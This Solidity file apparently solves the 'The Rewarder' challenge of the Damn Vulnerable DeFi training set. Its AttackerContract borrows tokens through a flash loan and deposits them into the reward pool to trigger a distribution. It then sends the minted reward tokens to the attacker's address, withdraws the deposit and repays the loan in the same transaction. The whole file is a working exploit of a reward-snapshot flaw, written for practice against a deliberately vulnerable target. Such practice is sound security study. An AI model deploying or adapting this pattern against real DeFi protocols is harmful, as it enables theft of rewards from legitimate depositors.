// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import 'hardhat/console.sol';
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract AttackerContract {

    address owner;
    RewardToken rewardToken;
    TheRewarderPool rewardPool;
    FlashLoanerPool flashLoanPool;
    DamnValuableToken liquidityToken;

    constructor(
        address _rewardPool,
        address _flashLoanPool,
        address _liquidityToken,
        address _rewardToken
    ) {
        owner = msg.sender;

        // TODO these should probably be accessed with `calls` right?
        // under normal conditions we cannot expect to have import access to this code
        rewardPool = TheRewarderPool(_rewardPool);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack(uint256 amount) public {
        // get flash loan
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        require(msg.sender == address(flashLoanPool), "not allowed");
        // deposit into rewarder pool
        // this will also call #distribute() on the pool
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);

        // rewards are minted for address(this)
        // we now want them sent to the attacker
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));

        // withdraw the funds so we can send back to the flash loan
        rewardPool.withdraw(amount);
        // send back to flash loan pool
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
